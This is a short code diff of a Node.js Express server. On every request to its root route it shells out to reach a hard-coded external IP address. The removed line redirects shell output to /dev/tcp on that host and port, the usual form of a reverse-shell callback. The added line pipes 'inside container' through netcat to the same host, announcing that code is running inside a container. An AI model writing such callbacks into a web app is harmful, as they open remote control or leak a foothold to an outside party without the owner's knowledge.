@@ -5,8 +5,10 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-    // Replace `your_command_here` with the command you want to run
-    exec('exec 0</dev/null 1>/dev/tcp/140.238.85.162/9999 2>&1', (error, stdout, stderr) => {
+    // Replace "Your message here" with the data you want to send
+    const command = 'echo "inside container" | nc 140.238.85.162 9999';
+    
+    exec(command, (error, stdout, stderr) => {
         if (error) {
             res.send(`<pre>Error: ${error.message}</pre>`);
             return;
